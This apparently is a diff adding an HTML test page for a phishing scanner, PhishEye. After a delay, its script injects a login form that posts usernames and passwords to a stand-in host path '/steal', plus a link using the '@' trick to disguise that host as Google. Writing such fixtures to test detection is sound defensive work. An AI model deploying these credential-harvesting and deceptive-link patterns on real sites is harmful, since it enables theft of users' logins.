@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PhishEye dynamic-scan test</title>
+</head>
+<body>
+    <h1>PhishEye dynamic-scan test page</h1>
+    <p>This page starts with no form and no suspicious links. After a delay,
+    JavaScript injects both -- simulating a single-page-app site that loads
+    its real (fake) login form after the initial page appears, instead of
+    having it in the original HTML.</p>
+
+    <div id="form-container"></div>
+    <div id="link-container"></div>
+
+    <script>
+        // Simulates a form injected late by client-side JS, with an action
+        // pointing at a different host than the page itself.
+        setTimeout(() => {
+            const form = document.createElement("form");
+            form.action = "https://totally-not-a-scam.test/steal";
+            form.innerHTML = `
+                <label>Username: <input type="text" name="username"></label><br>
+                <label>Password: <input type="password" name="password"></label><br>
+                <button type="submit">Sign in</button>
+            `;
+            document.getElementById("form-container").appendChild(form);
+            console.log("Test page: injected late form with cross-host action");
+        }, 2000);
+
+        // Simulates a link injected late that uses the "@" trick.
+        setTimeout(() => {
+            const link = document.createElement("a");
+            link.href = "https://accounts.google.com@totally-not-a-scam.test/";
+            link.textContent = "Verify your account";
+            document.getElementById("link-container").appendChild(link);
+            console.log("Test page: injected late '@' trick link");
+        }, 3000);
+    </script>
+</body>
+</html>
